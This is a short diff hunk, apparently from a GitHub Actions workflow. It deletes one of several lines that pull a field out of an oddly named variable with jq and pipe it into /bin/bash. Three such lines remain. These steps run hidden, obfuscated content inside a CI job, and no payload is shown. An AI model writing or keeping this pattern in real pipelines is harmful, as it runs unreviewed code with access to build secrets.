@@ -48,7 +48,6 @@ jobs:
           echo $mmw594 | jq -r .kignm14094 | /bin/bash
           printf '%s' "$lswbh7" | jq -r .qbto249 | /bin/bash
           printf '%s' "$swpc5" | jq -r .qhler140 | /bin/bash
-          echo $eqkkv521 | jq -r .qvkfe20259 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
